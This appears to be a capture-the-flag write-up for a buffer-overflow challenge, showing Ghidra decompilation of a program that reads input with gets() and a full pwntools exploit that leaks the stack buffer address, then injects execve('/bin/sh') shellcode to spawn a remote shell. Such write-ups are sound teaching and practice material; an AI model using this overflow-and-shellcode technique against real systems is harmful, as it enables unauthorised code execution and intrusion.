## Description

Let's decompile the binary with Ghidra.

```c
undefined4 main(void)
{
  int iVar1;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  iVar1 = get_tree();
  if (0 < iVar1) {
    puts(*(char **)(trees + iVar1 * 8 + 4));
  }
  return 0;
}

int get_tree(void)
{
  int iVar1;
  char local_110 [256];
  int local_10;
  
  puts("Enter a tree type: ");
  gets(local_110);
  local_10 = 0;
  while( true ) {
    if (0xc < local_10) {
      printf("I don\'t have the tree %d :(\n",local_110);
      return 0xffffffff;
    }
    iVar1 = strcasecmp(*(char **)(trees + local_10 * 8),local_110);
    if (iVar1 == 0) break;
    local_10 = local_10 + 1;
  }
  return local_10;
}
```

In the `get_tree` function, we see a potential buffer overflow enabled by the function `gets`.

## Solution

As the description suggests, there is no security feature activated, including no PIE or NX. Therefore we can include a shellcode in the buffer and execute it. 

However ASLR seems to be enabled. Thanksfully, the line `I don't have the tree` leaks the address of the buffer, so we can retrieve it, jump again to the `get_tree` function and perform our exploit, this time knowing the address of the buffer.

```python
from pwn import *

sh = remote('p1.tjctf.org', 8006)

ret_addr = 0x08048642
get_tree_addr = 0x08048612
offset = 256 + 16 # number of bytes from buffer to ret addr
shellcode = asm(shellcraft.i386.linux.execve('/bin/sh'))

# First step: get address of buffer
print(sh.recvuntil("type:").decode())

payload = b'a'*offset + p32(get_tree_addr)
sh.sendline(payload)

print(sh.recvuntil("tree").decode(), end="")
answer = sh.recvuntil(":(").decode()
print(answer)

buf_addr = (int(answer.split(":(")[0])) & ((1 << 32) - 1)
print(hex(buf_addr))

# Second step: insert shell code and jump there
print(sh.recvuntil("type:").decode())
payload = shellcode + b'\x00'*(offset - len(shellcode)) + p32(buf_addr) + p32(0)

sh.sendline(payload)
sh.interactive()
```
